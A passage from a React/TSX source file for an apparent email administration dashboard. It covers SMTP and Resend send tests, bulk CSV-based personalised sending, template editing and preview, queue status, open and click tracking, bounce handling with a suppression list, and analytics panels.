                      {autoState.results.filter((r) => r.status === "pass").length}
                    </p>
                    <p className="text-[10px] text-muted-foreground">Passed</p>
                  </div>
                  <div className="rounded-md bg-red-500/10 p-2">
                    <p className="text-lg font-bold text-red-600">
                      {autoState.results.filter((r) => r.status === "fail").length}
                    </p>
                    <p className="text-[10px] text-muted-foreground">Failed</p>
                  </div>
                </div>
              </div>
            )}
          </CardContent>
        </Card>

        {/* ================================================================ */}
        {/*  SMTP SEND TEST                                                  */}
        {/* ================================================================ */}
        <Card>
          <CardHeader className="pb-3">
            <CardTitle className="text-sm">SMTP Send Test</CardTitle>
            <CardDescription className="text-xs">
              Send a test email through any SMTP server to verify delivery
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-3">
            {/* Saved config selector */}
            <div className="space-y-1">
              <Label className="text-xs">Use Saved Config</Label>
              <Select
                value={selectedSmtpConfigId || "__manual__"}
                onValueChange={(val) => {
                  const id = (val === "__manual__" || val === null) ? "" : val
                  setSelectedSmtpConfigId(id)
                  const cfg = smtpConfigs.find((c) => c.id === id)
                  if (cfg) {
                    setSmtpHost(cfg.host)
                    setSmtpPort(String(cfg.port))
                    setSmtpSecure(cfg.secure)
                    setSmtpUser(cfg.username ?? "")
                    setSmtpFrom(cfg.fromEmail)
                  }
                }}
              >
                <SelectTrigger className="h-8 text-sm">
                  <SelectValue placeholder="-- Manual config --" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="__manual__">-- Manual config --</SelectItem>
                  {smtpConfigs.map((cfg) => (
                    <SelectItem key={cfg.id} value={cfg.id}>
                      {cfg.name} ({cfg.host}:{cfg.port})
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>

            <div className="grid grid-cols-2 gap-2">
              <div className="space-y-1">
                <Label className="text-xs">SMTP Host</Label>
                <Input
                  value={smtpHost}
                  onChange={(e) => setSmtpHost(e.target.value)}
                  placeholder="smtp.gmail.com"
                  className="h-8 text-sm"
                />
              </div>
              <div className="space-y-1">
                <Label className="text-xs">Port</Label>
                <Input
                  value={smtpPort}
                  onChange={(e) => {
                    const val = e.target.value
                    setSmtpPort(val)
                    const n = parseInt(val)
                    if (n === 465) setSmtpSecure(true)
                    else if (n === 587 || n === 25 || n === 2525) setSmtpSecure(false)
                  }}
                  placeholder="587"
                  className="h-8 text-sm"
                />
              </div>
            </div>

            <div className="grid grid-cols-2 gap-2">
              <div className="space-y-1">
                <Label className="text-xs">Username</Label>
                <Input
                  value={smtpUser}
                  onChange={(e) => setSmtpUser(e.target.value)}
                  placeholder="user@example.com"
                  className="h-8 text-sm"
                />
              </div>
              <div className="space-y-1">
                <Label className="text-xs">Password</Label>
                <Input
                  type="password"
                  value={smtpPass}
                  onChange={(e) => setSmtpPass(e.target.value)}
                  className="h-8 text-sm"
                />
              </div>
            </div>

            <div className="flex items-center gap-2">
              <Switch
                checked={smtpSecure}
                onCheckedChange={(checked) => {
                  setSmtpSecure(checked)
                  const n = parseInt(smtpPort)
                  if (checked && (n === 587 || n === 25 || n === 2525)) setSmtpPort("465")
                  else if (!checked && n === 465) setSmtpPort("587")
                }}
              />
              <Label className="text-sm cursor-pointer">Use TLS — port 465 (SSL) · uncheck for 587/25 (STARTTLS)</Label>
            </div>

            <div className="grid grid-cols-2 gap-2">
              <div className="space-y-1">
                <Label className="text-xs">From</Label>
                <Input
                  value={smtpFrom}
                  onChange={(e) => setSmtpFrom(e.target.value)}
                  placeholder="(defaults to username)"
                  className="h-8 text-sm"
                />
              </div>
              <div className="space-y-1">
                <Label className="text-xs">To</Label>
                <Input
                  value={sendTo}
                  onChange={(e) => setSendTo(e.target.value)}
                  placeholder="test@example.com"
                  className="h-8 text-sm"
                />
              </div>
            </div>

            <div className="space-y-1">
              <Label className="text-xs">Subject</Label>
              <Input
                value={sendSubject}
                onChange={(e) => setSendSubject(e.target.value)}
                className="h-8 text-sm"
              />
            </div>

            <div className="space-y-1">
              <Label className="text-xs">Body</Label>
              <Textarea
                value={sendBody}
                onChange={(e) => setSendBody(e.target.value)}
                rows={3}
                className="text-sm resize-none"
              />
            </div>

            <Button
              className="w-full"
              onClick={handleSendTest}
              disabled={
                sendingTest ||
                !sendTo ||
                (selectedSmtpConfigId ? false : !smtpHost || !smtpUser || !smtpPass)
              }
            >
              {sendingTest ? "Sending..." : "Send Test Email"}
            </Button>
          </CardContent>
        </Card>

        {/* ================================================================ */}
        {/*  RESEND SEND TEST                                                 */}
        {/* ================================================================ */}
        <Card>
          <CardHeader className="pb-3">
            <CardTitle className="text-sm">Resend Send Test</CardTitle>
            <CardDescription className="text-xs">
              Send a test email via Resend API (configured in .env)
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-3">
            <div className="space-y-1">
              <Label className="text-xs">To</Label>
              <Input
                value={resendTo}
                onChange={(e) => setResendTo(e.target.value)}
                placeholder="test@example.com"
                className="h-8 text-sm"
              />
            </div>

            <div className="space-y-1">
              <Label className="text-xs">Subject</Label>
              <Input
                value={resendSubject}
                onChange={(e) => setResendSubject(e.target.value)}
                className="h-8 text-sm"
              />
            </div>

            <div className="space-y-1">
              <Label className="text-xs">Body</Label>
              <Textarea
                value={resendBody}
                onChange={(e) => setResendBody(e.target.value)}
                rows={3}
                className="text-sm resize-none"
              />
            </div>

            <Button
              className="w-full"
              onClick={handleSendResend}
              disabled={sendingResend || !resendTo}
            >
              {sendingResend ? "Sending..." : "Send via Resend"}
            </Button>
          </CardContent>
        </Card>

        {/* ================================================================ */}
        {/*  BULK EMAIL SEND                                                  */}
        {/* ================================================================ */}
        <Card>
          <CardHeader className="pb-3">
            <CardTitle className="text-sm">Bulk Email Send</CardTitle>
            <CardDescription className="text-xs">
              Upload a CSV with firstname,lastname,email and send personalized emails
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-3">
            {/* Provider */}
            <div className="space-y-1">
              <Label className="text-xs">Provider</Label>
              <Select
                value={bulkProvider}
                onValueChange={(val) => { if (val !== null) setBulkProvider(val as "smtp" | "resend" | "mysmtp") }}
              >
                <SelectTrigger className="h-8 text-sm">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="smtp">SMTP (saved config)</SelectItem>
                  <SelectItem value="resend">Resend API</SelectItem>
                  <SelectItem value="mysmtp">my.smtp.com API</SelectItem>
                </SelectContent>
              </Select>
            </div>

            {bulkProvider === "smtp" && (
              <div className="space-y-1">
                <Label className="text-xs">SMTP Config</Label>
                <Select
                  value={bulkSmtpConfigId || "__default__"}
                  onValueChange={(val) => setBulkSmtpConfigId(val === "__default__" || val === null ? "" : val)}
                >
                  <SelectTrigger className="h-8 text-sm">
                    <SelectValue placeholder="-- Default config --" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="__default__">-- Default config --</SelectItem>
                    {smtpConfigs.map((cfg) => (
                      <SelectItem key={cfg.id} value={cfg.id}>
                        {cfg.name} ({cfg.host}:{cfg.port})
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
            )}

            {/* Rate limits */}
            <div className="grid grid-cols-3 gap-2">
              <div className="space-y-1">
                <Label className="text-xs">Rate/min</Label>
                <Input
                  value={bulkRateLimit}
                  onChange={(e) => setBulkRateLimit(e.target.value)}
                  className="h-8 text-sm"
                />
              </div>
              <div className="space-y-1">
                <Label className="text-xs">Batch</Label>
                <Input
                  value={bulkBatchSize}
                  onChange={(e) => setBulkBatchSize(e.target.value)}
                  className="h-8 text-sm"
                />
              </div>
              <div className="space-y-1">
                <Label className="text-xs">Delay ms</Label>
                <Input
                  value={bulkDelayMs}
                  onChange={(e) => setBulkDelayMs(e.target.value)}
                  className="h-8 text-sm"
                />
              </div>
            </div>

            {/* CSV Upload */}
            <div className="space-y-1">
              <Label className="text-xs">CSV (firstname,lastname,email)</Label>
              <div className="flex gap-2">
                <input
                  type="file"
                  accept=".csv"
                  onChange={handleFileUpload}
                  className="text-xs file:mr-2 file:rounded-md file:border file:border-border file:bg-muted file:px-2 file:py-1 file:text-xs"
                />
              </div>
              <Textarea
                value={bulkCsvText}
                onChange={(e) => setBulkCsvText(e.target.value)}
                placeholder={`John,Doe,john@example.com\nJane,Smith,jane@example.com`}
                rows={4}
                className="text-sm font-mono resize-none"
              />
            </div>

            {/* Subject & Body */}
            <div className="space-y-1">
              <Label className="text-xs">Subject</Label>
              <Input
                value={bulkSubject}
                onChange={(e) => setBulkSubject(e.target.value)}
                placeholder="Hello {{firstName}}"
                className="h-8 text-sm"
              />
              <p className="text-[10px] text-muted-foreground">
                Variables: {"{{firstName}}"}, {"{{lastName}}"}, {"{{email}}"}, {"{{name}}"}
              </p>
            </div>

            <div className="space-y-1">
              <Label className="text-xs">Body (text)</Label>
              <Textarea
                value={bulkBody}
                onChange={(e) => setBulkBody(e.target.value)}
                placeholder="Hi {{name}}, ..."
                rows={3}
                className="text-sm resize-none"
              />
            </div>

            <div className="space-y-1">
              <Label className="text-xs">Body (HTML, optional)</Label>
              <Textarea
                value={bulkHtmlBody}
                onChange={(e) => setBulkHtmlBody(e.target.value)}
                placeholder="<p>Hi {{name}}, ...</p>"
                rows={2}
                className="text-sm resize-none"
              />
            </div>

            {/* Dry run result */}
            {bulkDryRunResult && (
              <div className="rounded-md bg-muted p-3 space-y-1 text-xs">
                <p className="font-medium">Dry Run Results</p>
                <div className="grid grid-cols-3 gap-2">
                  <div className="text-center">
                    <p className="font-bold">{bulkDryRunResult.summary.totalRecords}</p>
                    <p className="text-muted-foreground">Total</p>
                  </div>
                  <div className="text-center">
                    <p className="font-bold text-emerald-600">{bulkDryRunResult.summary.validEmails}</p>
                    <p className="text-muted-foreground">Valid</p>
                  </div>
                  <div className="text-center">
                    <p className="font-bold text-red-600">{bulkDryRunResult.summary.invalidEmails}</p>
                    <p className="text-muted-foreground">Invalid</p>
                  </div>
                </div>
                {bulkDryRunResult.preview?.firstRecipient && (
                  <div className="border-t pt-1 mt-1">
                    <p className="text-muted-foreground">Preview (first recipient):</p>
                    <p>Subject: {bulkDryRunResult.preview.firstRecipient.subject}</p>
                    <p>Body: {bulkDryRunResult.preview.firstRecipient.body}</p>
                  </div>
                )}
              </div>
            )}

            {/* Send result */}
            {bulkSendResult && (
              <div className="rounded-md bg-muted p-3 space-y-1 text-xs">
                <p className="font-medium">Send Results</p>
                <div className="grid grid-cols-3 gap-2">
                  <div className="text-center">
                    <p className="font-bold">{bulkSendResult.results.emailsSent}</p>
                    <p className="text-muted-foreground">Sent</p>
                  </div>
                  <div className="text-center">
                    <p className="font-bold text-red-600">{bulkSendResult.results.emailsFailed}</p>
                    <p className="text-muted-foreground">Failed</p>
                  </div>
                  <div className="text-center">
                    <p className="font-bold">{Math.round(bulkSendResult.results.durationMs / 1000)}s</p>
                    <p className="text-muted-foreground">Duration</p>
                  </div>
                </div>
              </div>
            )}

            <div className="grid grid-cols-2 gap-2">
              <Button
                variant="outline"
                onClick={handleBulkDryRun}
                disabled={bulkSending || !bulkCsvText.trim()}
              >
                {bulkSending && !bulkDryRunResult ? "Analyzing..." : "Dry Run"}
              </Button>
              <Button
                onClick={handleBulkSend}
                disabled={bulkSending || !bulkCsvText.trim() || !bulkSubject.trim() || !bulkBody.trim()}
              >
                {bulkSending ? "Sending..." : "Send Emails"}
              </Button>
            </div>
          </CardContent>
        </Card>

        {/* ================================================================ */}
        {/*  INBOX PREVIEW                                                   */}
        {/* ================================================================ */}
        <Card>
          <CardHeader className="pb-3">
            <div className="flex items-center justify-between">
              <div>
                <CardTitle className="text-sm">Inbox Preview</CardTitle>
                <CardDescription className="text-xs">
                  {selectedAccount
                    ? `Viewing: ${accounts.find((a) => a.id === selectedAccount)?.label ?? selectedAccount}`
                    : "Click \"Inbox\" on an account to preview messages"}
                </CardDescription>
              </div>
              {selectedAccount && (
                <Button
                  size="sm"
                  variant="outline"
                  onClick={() => loadMessages(selectedAccount)}
                  disabled={loadingMessages}
                >
                  {loadingMessages ? "Loading..." : "Refresh"}
                </Button>
              )}
            </div>
          </CardHeader>
          <CardContent className="max-h-[440px] overflow-y-auto space-y-2">
            {!selectedAccount ? (
              <p className="text-xs text-muted-foreground">No account selected.</p>
            ) : loadingMessages ? (
              <p className="text-xs text-muted-foreground">Loading messages...</p>
            ) : messages.length === 0 ? (
              <p className="text-xs text-muted-foreground">No messages found.</p>
            ) : (
              messages.map((msg) => (
                <div
                  key={msg.uid}
                  className="rounded-lg border p-3 space-y-1"
                >
                  <div className="flex items-start justify-between gap-2">
                    <p className="text-sm font-medium truncate flex-1">
                      {msg.subject ?? "(no subject)"}
                    </p>
                    {msg.attachments.length > 0 && (
                      <Badge variant="secondary" className="text-[10px] shrink-0">
                        {msg.attachments.length} file{msg.attachments.length !== 1 && "s"}
                      </Badge>
                    )}
                  </div>
                  <div className="flex gap-4 text-xs text-muted-foreground">
                    <span>From: {msg.from ?? "unknown"}</span>
                    <span>To: {msg.to ?? "unknown"}</span>
                  </div>
                  {msg.date && (
                    <p className="text-[10px] text-muted-foreground">
                      {new Date(msg.date).toLocaleString()}
                    </p>
                  )}
                </div>
              ))
            )}
          </CardContent>
        </Card>
      </div>

      {/* ================================================================ */}
      {/*  FULL TEST RESULTS TABLE                                         */}
      {/* ================================================================ */}
      {autoState && autoState.results.length > 0 && (
        <Card>
          <CardHeader className="pb-3">
            <CardTitle className="text-sm">Test Results Detail</CardTitle>
            <CardDescription className="text-xs">
              Detailed results from the last test run
            </CardDescription>
          </CardHeader>
          <CardContent>
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead>
                  <tr className="border-b text-xs text-muted-foreground">
                    <th className="text-left py-2 pr-4">Account</th>
                    <th className="text-left py-2 pr-4">Protocol</th>
                    <th className="text-left py-2 pr-4">Status</th>
                    <th className="text-right py-2 pr-4">Latency</th>
                    <th className="text-right py-2 pr-4">Messages</th>
                    <th className="text-left py-2">Error</th>
                  </tr>
                </thead>
                <tbody>
                  {autoState.results.map((r) => (
                    <tr key={r.accountId} className="border-b last:border-0">
                      <td className="py-2 pr-4 font-medium">{r.label ?? r.accountId}</td>
                      <td className="py-2 pr-4">
                        <Badge variant="secondary" className="text-[10px]">
                          {r.protocol.toUpperCase()}
                        </Badge>
                      </td>
                      <td className="py-2 pr-4">
                        <Badge
                          variant={r.status === "pass" ? "default" : "destructive"}
                          className="text-[10px]"
                        >
                          {r.status.toUpperCase()}
                        </Badge>
                      </td>
                      <td className="py-2 pr-4 text-right tabular-nums">
                        {r.latencyMs}ms
                      </td>
                      <td className="py-2 pr-4 text-right tabular-nums">
                        {r.messageCount ?? "-"}
                      </td>
                      <td className="py-2 text-xs text-destructive truncate max-w-[300px]">
                        {r.error ?? "-"}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </CardContent>
        </Card>
      )}
        </TabsContent>

        <TabsContent value="smtp-configs" className="space-y-6">
          <SmtpConfigManager />
        </TabsContent>

        <TabsContent value="templates" className="space-y-6">
          <div className="grid gap-6 xl:grid-cols-2">
            <Card>
              <CardHeader>
                <CardTitle className="text-sm">Email Template Editor</CardTitle>
                <CardDescription className="text-xs">
                  Create and manage email templates with variable substitution
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="grid grid-cols-2 gap-2">
                  <Input
                    placeholder="Template name"
                    value={templateName}
                    onChange={(e) => setTemplateName(e.target.value)}
                    className="h-8 text-sm"
                  />
                  <Select value={templateCategory} onValueChange={(val) => { if (val !== null) setTemplateCategory(val) }}>
                    <SelectTrigger className="h-8 text-sm">
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="general">General</SelectItem>
                      <SelectItem value="marketing">Marketing</SelectItem>
                      <SelectItem value="transactional">Transactional</SelectItem>
                      <SelectItem value="newsletter">Newsletter</SelectItem>
                      <SelectItem value="notification">Notification</SelectItem>
                    </SelectContent>
                  </Select>
                </div>

                <div className="space-y-1">
                  <Label className="text-xs">Description</Label>
                  <Input
                    placeholder="Template description"
                    value={templateDescription}
                    onChange={(e) => setTemplateDescription(e.target.value)}
                    className="h-8 text-sm"
                  />
                </div>

                <div className="space-y-1">
                  <Label className="text-xs">Tags</Label>
                  <div className="flex gap-2">
                    <Input
                      placeholder="Add tag"
                      value={templateTagInput}
                      onChange={(e) => setTemplateTagInput(e.target.value)}
                      onKeyPress={(e) => e.key === "Enter" && (e.preventDefault(), addTemplateTag())}
                      className="h-8 text-sm"
                    />
                    <Button onClick={addTemplateTag} variant="outline" size="sm">
                  Add
                </Button>
              </div>
              {templateTags.length > 0 && (
                <div className="flex flex-wrap gap-2">
                  {templateTags.map((tag) => (
                    <Badge key={tag} variant="secondary" className="text-xs">
                      {tag}
                      <button
                        onClick={() => removeTemplateTag(tag)}
                        className="ml-1 hover:text-destructive"
                      >
                        ×
                      </button>
                    </Badge>
                  ))}
                </div>
              )}
            </div>

            <div className="space-y-1">
              <Label className="text-xs">Subject</Label>
              <Input
                placeholder="Email subject with {{variable}} placeholders"
                value={templateSubject}
                onChange={(e) => setTemplateSubject(e.target.value)}
                className="h-8 text-sm"
              />
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-1">
                <Label className="text-xs">HTML Content</Label>
                <Textarea
                  placeholder="<html><body>Hello {{name}},...</body></html>"
                  value={templateHtml}
                  onChange={(e) => setTemplateHtml(e.target.value)}
                  rows={10}
                  className="text-sm font-mono"
                />
              </div>
              <div className="space-y-1">
                <Label className="text-xs">Text Content</Label>
                <Textarea
                  placeholder="Hello {{name}},..."
                  value={templateText}
                  onChange={(e) => setTemplateText(e.target.value)}
                  rows={10}
                  className="text-sm font-mono"
                />
              </div>
            </div>

            {templateVariables.length > 0 && (
              <div className="space-y-1">
                <label className="text-xs font-medium text-muted-foreground">Detected Variables</label>
                <div className="flex flex-wrap gap-2">
                  {templateVariables.map((v) => (
                    <Badge key={v} variant="secondary" className="text-xs">
                      {`{{${v}}}`}
                    </Badge>
                  ))}
                </div>
              </div>
            )}

            <div className="flex gap-2">
              <Button onClick={extractTemplateVariables} variant="outline" size="sm">
                Extract Variables
              </Button>
              <Button onClick={previewTemplate} variant="outline" size="sm">
                Preview
              </Button>
              <Button onClick={saveTemplate} size="sm" className="flex-1">
                Save Template
              </Button>
            </div>
          </CardContent>
        </Card>

        {showPreview && (
          <Card>
            <CardHeader>
              <CardTitle className="text-sm">Template Preview</CardTitle>
              <CardDescription className="text-xs">
                Preview with sample variables
              </CardDescription>
            </CardHeader>
            <CardContent>
              <div className="space-y-2 mb-4">
                <Label className="text-xs">Preview Variables</Label>
                <div className="grid grid-cols-2 gap-2">
                  <Input
                    placeholder="{{firstName}}"
                    value={previewVariables.firstName || ""}
                    onChange={(e) => setPreviewVariables({...previewVariables, firstName: e.target.value})}
                    className="h-8 text-sm"
                  />
                  <Input
                    placeholder="{{lastName}}"
                    value={previewVariables.lastName || ""}
                    onChange={(e) => setPreviewVariables({...previewVariables, lastName: e.target.value})}
                    className="h-8 text-sm"
                  />
                  <Input
                    placeholder="{{email}}"
                    value={previewVariables.email || ""}
                    onChange={(e) => setPreviewVariables({...previewVariables, email: e.target.value})}
                    className="h-8 text-sm"
                  />
                  <Button onClick={previewTemplate} variant="outline" size="sm">
                    Update Preview
                  </Button>
                </div>
              </div>
              <div className="border rounded-md p-4 bg-background">
                <div dangerouslySetInnerHTML={{ __html: previewHtml }} />
              </div>
            </CardContent>
          </Card>
        )}

        <Card>
          <CardHeader>
            <CardTitle className="text-sm">Saved Templates</CardTitle>
            <CardDescription className="text-xs">
              {templates.length} template{templates.length !== 1 && "s"}
            </CardDescription>
          </CardHeader>
          <CardContent>
            <div className="space-y-2 max-h-[400px] overflow-y-auto">
              {templates.length === 0 ? (
                <p className="text-xs text-muted-foreground">No templates saved yet.</p>
              ) : (
                templates.map((t) => (
                  <div key={t.id} className="flex items-center justify-between p-3 rounded border">
                    <div className="flex-1">
                      <div className="flex items-center gap-2">
                        <p className="text-sm font-medium">{t.name}</p>
                        <Badge variant="outline" className="text-[10px]">
                          {t.category || "general"}
                        </Badge>
                        {t.version && (
                          <Badge variant="secondary" className="text-[10px]">
                            v{t.version}
                          </Badge>
                        )}
                      </div>
                      <p className="text-xs text-muted-foreground">{t.subject}</p>
                      {t.tags && t.tags.length > 0 && (
                        <div className="flex gap-1 mt-1">
                          {t.tags.map((tag) => (
                            <Badge key={tag} variant="secondary" className="text-[10px]">
                              {tag}
                            </Badge>
                          ))}
                        </div>
                      )}
                    </div>
                    <div className="flex gap-2">
                      <Button
                        size="sm"
                        variant="outline"
                        onClick={() => {
                          setSelectedTemplate(t)
                          setTemplateName(t.name)
                          setTemplateSubject(t.subject)
                          setTemplateHtml(t.htmlContent)
                          setTemplateText(t.textContent)
                          setTemplateVariables(t.variables || [])
                          setTemplateCategory(t.category || "general")
                          setTemplateDescription(t.description || "")
                          setTemplateTags(t.tags || [])
                          loadTemplateVersions(t.id)
                        }}
                      >
                        Edit
                      </Button>
                      <Button
                        size="sm"
                        variant="destructive"
                        onClick={() => deleteTemplate(t.id)}
                      >
                        Delete
                      </Button>
                    </div>
                  </div>
                ))
              )}
            </div>
          </CardContent>
        </Card>
      </div>
    </TabsContent>

        <TabsContent value="queue" className="space-y-6">
          <div className="grid gap-6 xl:grid-cols-2">
            <Card>
              <CardHeader>
                <CardTitle className="text-sm">Queue Statistics</CardTitle>
                <CardDescription className="text-xs">Current queue status</CardDescription>
              </CardHeader>
              <CardContent>
                {queueStats ? (
                  <div className="grid grid-cols-2 gap-4">
                    <div className="rounded-md bg-muted p-3">
                      <p className="text-2xl font-bold">{queueStats.pending}</p>
                      <p className="text-xs text-muted-foreground">Pending</p>
                    </div>
                    <div className="rounded-md bg-blue-500/10 p-3">
                      <p className="text-2xl font-bold text-blue-600">{queueStats.processing}</p>
                      <p className="text-xs text-muted-foreground">Processing</p>
                    </div>
                    <div className="rounded-md bg-emerald-500/10 p-3">
                      <p className="text-2xl font-bold text-emerald-600">{queueStats.sent}</p>
                      <p className="text-xs text-muted-foreground">Sent</p>
                    </div>
                    <div className="rounded-md bg-red-500/10 p-3">
                      <p className="text-2xl font-bold text-red-600">{queueStats.failed}</p>
                      <p className="text-xs text-muted-foreground">Failed</p>
                    </div>
                  </div>
                ) : (
                  <p className="text-xs text-muted-foreground">Loading stats...</p>
                )}
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle className="text-sm">Queue Configuration</CardTitle>
                <CardDescription className="text-xs">Rate limiting and concurrency settings</CardDescription>
              </CardHeader>
              <CardContent>
                {queueConfig ? (
                  <div className="space-y-2 text-sm">
                    <p><span className="font-medium">Max Concurrent:</span> {queueConfig.maxConcurrent}</p>
                    <p><span className="font-medium">Rate Limit:</span> {queueConfig.rateLimitPerMinute}/min</p>
                    <p><span className="font-medium">Retry Attempts:</span> {queueConfig.retryAttempts}</p>
                    <p><span className="font-medium">Retry Delay:</span> {queueConfig.retryDelayMs}ms</p>
                  </div>
                ) : (
                  <p className="text-xs text-muted-foreground">Loading config...</p>
                )}
              </CardContent>
            </Card>
          </div>

          <Card>
            <CardHeader>
              <CardTitle className="text-sm">Queued Emails</CardTitle>
              <CardDescription className="text-xs">Emails waiting to be sent</CardDescription>
            </CardHeader>
            <CardContent className="max-h-[400px] overflow-y-auto">
              {queueEmails.length === 0 ? (
                <p className="text-xs text-muted-foreground">No emails in queue.</p>
              ) : (
                <div className="space-y-2">
                  {queueEmails.map((email) => (
                    <div key={email.id} className="p-3 rounded border">
                      <div className="flex justify-between items-start">
                        <div>
                          <p className="text-sm font-medium">{email.to}</p>
                          <p className="text-xs text-muted-foreground">{email.subject}</p>
                        </div>
                        <Badge variant={
                          email.status === "sent" ? "default" :
                          email.status === "failed" ? "destructive" :
                          email.status === "processing" ? "secondary" : "outline"
                        }>
                          {email.status}
                        </Badge>
                      </div>
                      {email.error && (
                        <p className="text-xs text-destructive mt-1">{email.error}</p>
                      )}
                    </div>
                  ))}
                </div>
              )}
            </CardContent>
          </Card>
        </TabsContent>

        <TabsContent value="tracking" className="space-y-6">
          <Card>
            <CardHeader>
              <CardTitle className="text-sm">Email Tracking Events</CardTitle>
              <CardDescription className="text-xs">Track opens, clicks, and engagement</CardDescription>
            </CardHeader>
            <CardContent className="max-h-[500px] overflow-y-auto">
              {trackingEvents.length === 0 ? (
                <p className="text-xs text-muted-foreground">No tracking events yet.</p>
              ) : (
                <div className="space-y-2">
                  {trackingEvents.map((event) => (
                    <div key={event.id} className="p-3 rounded border">
                      <div className="flex justify-between items-start">
                        <div>
                          <p className="text-sm font-medium">{event.recipient}</p>
                          <p className="text-xs text-muted-foreground">
                            {event.type === "pixel" ? "Email Opened" : "Link Clicked"}
                          </p>
                        </div>
                        <Badge variant="secondary">{event.type}</Badge>
                      </div>
                      <p className="text-xs text-muted-foreground mt-1">
                        {new Date(event.timestamp).toLocaleString()}
                      </p>
                    </div>
                  ))}
                </div>
              )}
            </CardContent>
          </Card>
        </TabsContent>

        <TabsContent value="bounce" className="space-y-6">
          <div className="grid gap-6 xl:grid-cols-2">
            <Card>
              <CardHeader>
                <CardTitle className="text-sm">Bounce Statistics</CardTitle>
                <CardDescription className="text-xs">Email delivery failures</CardDescription>
              </CardHeader>
              <CardContent>
                {bounceStats ? (
                  <div className="grid grid-cols-2 gap-4">
                    <div className="rounded-md bg-muted p-3">
                      <p className="text-2xl font-bold">{bounceStats.total}</p>
                      <p className="text-xs text-muted-foreground">Total Bounces</p>
                    </div>
                    <div className="rounded-md bg-red-500/10 p-3">
                      <p className="text-2xl font-bold text-red-600">{bounceStats.hard}</p>
                      <p className="text-xs text-muted-foreground">Hard Bounces</p>
                    </div>
                    <div className="rounded-md bg-yellow-500/10 p-3">
                      <p className="text-2xl font-bold text-yellow-600">{bounceStats.soft}</p>
                      <p className="text-xs text-muted-foreground">Soft Bounces</p>
                    </div>
                    <div className="rounded-md bg-orange-500/10 p-3">
                      <p className="text-2xl font-bold text-orange-600">{bounceStats.complaints}</p>
                      <p className="text-xs text-muted-foreground">Complaints</p>
                    </div>
                  </div>
                ) : (
                  <p className="text-xs text-muted-foreground">Loading stats...</p>
                )}
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle className="text-sm">Suppressed Emails</CardTitle>
                <CardDescription className="text-xs">Emails blocked from future sends</CardDescription>
              </CardHeader>
              <CardContent className="max-h-[200px] overflow-y-auto">
                {suppressedEmails.length === 0 ? (
                  <p className="text-xs text-muted-foreground">No suppressed emails.</p>
                ) : (
                  <div className="space-y-1">
                    {suppressedEmails.map((email) => (
                      <p key={email} className="text-sm font-mono">{email}</p>
                    ))}
                  </div>
                )}
              </CardContent>
            </Card>
          </div>

          <Card>
            <CardHeader>
              <CardTitle className="text-sm">Recent Bounce Events</CardTitle>
              <CardDescription className="text-xs">Detailed bounce information</CardDescription>
            </CardHeader>
            <CardContent className="max-h-[400px] overflow-y-auto">
              {bounceEvents.length === 0 ? (
                <p className="text-xs text-muted-foreground">No bounce events yet.</p>
              ) : (
                <div className="space-y-2">
                  {bounceEvents.map((event) => (
                    <div key={event.id} className="p-3 rounded border">
                      <div className="flex justify-between items-start">
                        <div>
                          <p className="text-sm font-medium">{event.recipient}</p>
                          <p className="text-xs text-muted-foreground">{event.bounceReason}</p>
                        </div>
                        <Badge variant={
                          event.bounceType === "hard" ? "destructive" :
                          event.bounceType === "complaint" ? "secondary" : "outline"
                        }>
                          {event.bounceType}
                        </Badge>
                      </div>
                      <p className="text-xs text-muted-foreground mt-1">
                        {new Date(event.timestamp).toLocaleString()}
                      </p>
                    </div>
                  ))}
                </div>
              )}
            </CardContent>
          </Card>
        </TabsContent>

        <TabsContent value="analytics" className="space-y-6">
          <div className="grid gap-6 xl:grid-cols-3">
            <Card>
              <CardHeader>
                <CardTitle className="text-sm">Email Performance</CardTitle>
                <CardDescription className="text-xs">Overall email metrics</CardDescription>
              </CardHeader>
              <CardContent>
                {analytics ? (
                  <div className="space-y-4">
                    <div className="rounded-md bg-muted p-3">
                      <p className="text-2xl font-bold">{analytics.totalOpens}</p>
                      <p className="text-xs text-muted-foreground">Total Opens</p>
                    </div>
                    <div className="rounded-md bg-blue-500/10 p-3">
                      <p className="text-2xl font-bold text-blue-600">{analytics.openRate.toFixed(1)}%</p>
                      <p className="text-xs text-muted-foreground">Open Rate</p>
                    </div>
                    <div className="rounded-md bg-emerald-500/10 p-3">
                      <p className="text-2xl font-bold text-emerald-600">{analytics.totalClicks}</p>
                      <p className="text-xs text-muted-foreground">Total Clicks</p>
                    </div>
                    <div className="rounded-md bg-purple-500/10 p-3">
                      <p className="text-2xl font-bold text-purple-600">{analytics.clickRate.toFixed(1)}%</p>
                      <p className="text-xs text-muted-foreground">Click Rate</p>
                    </div>
                  </div>
                ) : (
                  <p className="text-xs text-muted-foreground">Loading analytics...</p>
                )}
              </CardContent>
            </Card>

            <Card className="xl:col-span-2">
              <CardHeader>
                <CardTitle className="text-sm">Tracking Configuration</CardTitle>
                <CardDescription className="text-xs">Configure email tracking settings</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="flex items-center justify-between">
                  <Label className="text-sm font-medium">Enable Tracking</Label>
                  <Switch checked={trackingEnabled} onCheckedChange={setTrackingEnabled} />
                </div>

                {trackingEnabled && (
                  <>
                    <div className="space-y-1">
                      <Label className="text-xs">Tracking Domain</Label>
                      <Input
                        type="url"
                        placeholder="https://yourdomain.com"
                        value={trackingDomain}
                        onChange={(e) => setTrackingDomain(e.target.value)}
                        className="h-8 text-sm"
                      />
                    </div>

                    <div className="flex items-center justify-between">
                      <Label className="text-sm font-medium">Track Opens</Label>
                      <Switch checked={trackOpens} onCheckedChange={setTrackOpens} />
                    </div>

                    <div className="flex items-center justify-between">
